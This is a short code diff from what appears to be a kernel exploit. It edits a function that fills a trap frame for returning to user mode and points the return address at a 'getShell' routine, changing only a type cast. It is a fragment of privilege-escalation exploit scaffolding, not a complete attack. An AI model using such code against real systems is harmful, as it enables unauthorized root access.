@@ -11,5 +11,5 @@ void prepTF64(uint64_t *user_rip, _Bool verbose) {
         "mov tf+24, rsp;"
         "mov tf+32, ss;"
         );
-    *user_rip = getShell;
+    *user_rip = (uint64_t)getShell;
 }
